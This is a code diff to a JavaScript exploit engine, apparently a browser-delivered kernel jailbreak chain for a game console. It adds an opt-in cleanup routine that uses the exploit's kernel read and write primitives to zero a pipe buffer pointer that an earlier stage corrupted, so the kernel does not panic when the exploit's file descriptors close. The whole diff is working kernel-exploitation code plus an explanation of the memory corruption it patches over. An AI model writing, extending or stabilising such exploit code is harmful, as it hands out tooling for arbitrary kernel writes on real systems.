@@ -8383,12 +8383,49 @@ export function makePoopsEngine(X) {
     }
   }
 
+  /* TEARDOWN PANIC GUARD - OPT-IN via ?nullpipe=1.
+   *
+   * stage5 points master.pipe_buffer.buffer at victim_pipe_data because kexp bootstraps its
+   * kernel r/w through that field. Nothing puts it back. victim_pipe_data was never carved
+   * out of pipe_map, so when the fd closes, pipeclose() inlines pipe_free_kmem(), calls
+   * vm_map_remove(pipe_map, buffer) on foreign memory and takes a Fatal trap 12.
+   *
+   * Navigating to the ELF loader page closes those fds, so the panic lands BEFORE that page
+   * renders. p2jb NULLs the field and does not panic; poopsploit does not and does.
+   *
+   * Must run AFTER kexp is finished - NULLing it earlier removes the primitive kexp is still
+   * reading through - which is why this sits in stage5's finally, not inside stage5Body.
+   *
+   * OFF BY DEFAULT. Retail and devkit work today; this writes kernel state on a live
+   * jailbreak, so it stays opt-in until it has hardware runs behind it. Without the flag the
+   * executed bytes are identical to before. */
+  async function nullMasterPipeBuf() {
+    if (!/[?&]nullpipe=1/i.test(String(location.search || ""))) return;
+    try {
+      if (!S.masterPipeData) { flushMark("NULLPIPE", "skipped-no-masterPipeData"); return; }
+      const before = await kread64Fast(S.masterPipeData.add32(0x10));
+      if (before.ret !== 8) { flushMark("NULLPIPE", "skipped-unreadable"); return; }
+      if (isZero64(before.v)) { flushMark("NULLPIPE", "already-zero"); return; }
+      const z = alloc(8, "nullpipe-zero");
+      w64(z.u8, 0, 0);
+      await kwriteFast(S.masterPipeData.add32(0x10), z, 8);
+      const after = await kread64Fast(S.masterPipeData.add32(0x10));
+      flushMark("NULLPIPE",
+        "was=" + hx(before.v) + "-now=" +
+        (after.ret === 8 ? hx(after.v) : "unreadable") +
+        "-ok=" + (after.ret === 8 && isZero64(after.v)));
+    } catch (e) {
+      flushMark("NULLPIPE", "failed-" + String((e && e.message) || e).slice(0, 60));
+    }
+  }
+
   async function stage5(opts) {
     const wasRace = setRaceMode(false);
     try {
       return await stage5Body(opts);
     } finally {
       setRaceMode(wasRace);
+      try { await nullMasterPipeBuf(); } catch (_) { }
     }
   }
 
